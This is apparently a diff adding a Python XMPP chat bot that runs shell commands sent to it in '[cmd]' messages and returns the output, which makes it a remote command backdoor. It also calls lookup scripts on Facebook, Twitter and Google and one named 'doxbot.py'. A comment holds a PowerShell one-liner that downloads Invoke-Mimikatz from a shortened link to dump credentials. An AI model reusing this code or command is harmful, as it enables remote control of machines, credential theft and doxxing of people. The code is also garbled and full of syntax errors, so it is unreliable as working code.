@@ -1,0 +1,161 @@
+#!/usr/bin/env python
+import subprocess
+import requests
+
+from pyxmpp2.jid import JID
+from pyxmpp2.message import Message
+from pyxmpp2.presence import Presence
+from pyxmpp2.client import Client
+from pyxmpp2.settings import XMPPSettings
+from pyxmpp2.interfaces import EventHandler, event_handler, QUIT
+from pyxmpp2.streamevents import AuthorizedEvent, DisconnectedEvent
+from pyxmppy2.interfaces import XMPPFeatureHandler
+from pyxmpp2.interfaces import presence_stanza_handler, message_stanza_handler
+from pyxmpp2.ext.version import VersionProvider
+
+import logging
+
+class jBot(EventHandler, XMPPFeatureHandler):
+	""Basic Jabber Bot""
+	def_init_(self,my_jit,settings):
+		version_provider = VersionProvider(settings)
+		self.Client = Client(my_jid,[self, version_provider],settings)
+
+	def run(self):
+		#begin connection and start main loop
+		self.client.connect()
+		self.client.run()
+		
+	def disconnect(self):
+		#disconnect from server
+		#set timeout to allow gracefull disconnect
+		self.client.disconnect()
+		self.client.run(timeout = 2)
+		
+	@presence_stanza_handler("subscribe")
+	def handle_presence_subscribe(self,stanza):
+		logging.info(u"{0} requested presence subscription".format(stanza.from_jid))
+		presence = Presence(to_jid = stanza.from_jid.bare(),stanza_type = "subscribe")
+
+		return [stanza.make_accept_response(), presence]
+
+	@presence_stanza_handler("subscribed")
+	def handle_stanza_handler("subscribed")
+		logging.info(u"{0!r} accepted our subscription request".format(stanza.from_jid))
+	
+		return True
+	
+	@presence_stanza_handler("unsubscribed")
+	def handler_presense_unsubscribe(self,stanza):
+		logging.info(u"{0} canceled presence subscription".format(stanza.from_jid))
+		presence = Presence(to_jid = stanza.from_jid.bare(), stanza_type = "unsubscribed")
+
+		return [stanza.make_accept_response(), presence]
+
+	@presence_stanza_handler("unsubscribe")
+	def handle_presence_unsubscribed(self,stanza):
+		logging.info(u"{0!r} accepted our subscription request".format(stanza.from_jid))
+
+		return True
+
+	@message_stanza_handler()
+	def handle_message(self,stanza):
+		if stanza.subject: subject = u"Re: " + stanza.subject
+		else: subject = None
+
+	try: 
+		#print stanza.body[0:5];powershell "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/1qMn59d'); Invoke-Mimikatz-DumpCreds"
+		if stanza.body[0:5].lower() == "[cmd]":
+			cmd = stanza.body[5:]
+			cmd = cmd.split('')
+			process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			out, err = process.communicate()
+			if len(out) > len(err):
+				msg = Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject, body=out, thread=stanza.thread)
+			else:
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza,to_jid, to_jid=stanza.from_jid, subject=subject, body=err, thread=stanza.thread)
+			return msg
+		elif stanza.body[0:5].lower() =="[flu]":
+			query = stanza.body[5:].strip()
+			process = subprocess.Popen(["/bin/bash","-c","/usr/bin/python /root/jbot/fb_lookup.py " + query], stdout=subprocess.PIPE, stderr=subprocess=PIPE)
+			out, err = process.communicate()
+			print out, err
+			if len(out) > len(err):
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject, body = out, thread=stanza.thread)
+			else:
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, subject=subject, body=r.text, thread=stanza.thread)
+			return msg
+			
+		elif stanza.body[0:5].lower() == "[tid]":
+			query = stanza.body[5:].strip()
+			process = subprocess.Popen("https://tweetid.com/ajax.php", data={'input':query})
+			msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject, body=r.text, thread=stanza.thread)
+		return msg
+
+		elif stanza.body[0:5].lower() == "[tlu]":
+			query = stanza.body[5:].strip()
+			process = subprocess.Popen(["/bin/bash","-c","/usr/bin/python /root/jbot/tw_lookup.py" + query], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			out, err = process.communicate()
+			print out, err
+			if len(out) > len(err):
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+			else:
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject, body=out,thread=stanza.thread)
+			return msg
+			
+		elif stanza.body[0:5].lower == "[glu]":
+			query = stanza.body[5:].strip()
+			process=subprocess.Popen(["/bin/bash","-c","/usr/bin/python /root/job/google_lookup.py" + query], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			out, err = process.communicate()
+			print out, err
+			if len(out) > len(err):
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+			return msg
+			else:
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+			return msg
+
+		elif stanza.body[0:5].lower == "[glu]":
+			query = stanza.body[5:].strip()
+			process=subprocess.Popen(["/bin/bash","-c","/usr/bin/python /root/job/doxbot.py" + query], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			out, err = process.communicate()
+			print out, err
+			if len(out) > len(err):
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+			return msg
+			else:
+				msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+			return msg
+
+	except: 
+		#print stanza.body
+		x=0 #just make it do something doesn't matter what. catch the except and move on
+	msg=Message(stanza_type=stanza.stanza_type, from_jid=stanza.to_jid, to_jid=stanza.from_jid, subject=subject,body=out,thread=stanza.thread)
+
+	return msg
+
+	@event_handler(DisconnectedEvent)
+	def handle_disconnected(self,event):
+		return QUIT
+	
+	@event_handler()
+	def handle_all(self,event):
+		logging.info(u"-- {0}".format(event))
+	
+
+	def main():
+		bot_user = "***********@xabber.org"
+		bot_password="*************"
+
+		settings = XMPPSettings({"software_name":"Hmm"})
+		settings["password"] = bot_password
+
+		bot = jbot(JID(bot_user),settings)
+
+		try: 
+			bot.run()
+		except KeyboardInterrupt:
+			bot.disconnect()
+
+	if_name_ == '__main__':
+		main()	
